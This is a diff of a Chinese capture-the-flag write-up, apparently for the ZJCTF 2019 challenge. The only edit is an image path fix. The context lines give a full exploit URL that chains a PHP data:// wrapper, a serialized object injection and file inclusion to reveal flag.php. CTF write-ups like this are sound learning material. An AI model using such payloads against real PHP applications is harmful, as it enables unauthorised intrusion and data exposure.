@@ -30,7 +30,7 @@ class Flag{  //flag.php
 3. 完整载荷如下，这里file利用伪协议的话，会让`echo $password`无法展示，故这里为useless.php   
 ```http://f24186f1-2297-429c-a5c2-67224f46c43a.node3.buuoj.cn?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}&file=useless.php```
 4. 在注释中含有flag  
-   ![](images/zjctf-2019-nz.png)
+   ![](../images/zjctf-2019-nz.png)
 
 ## 总结
 - [php伪协议与文件包含](https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/)
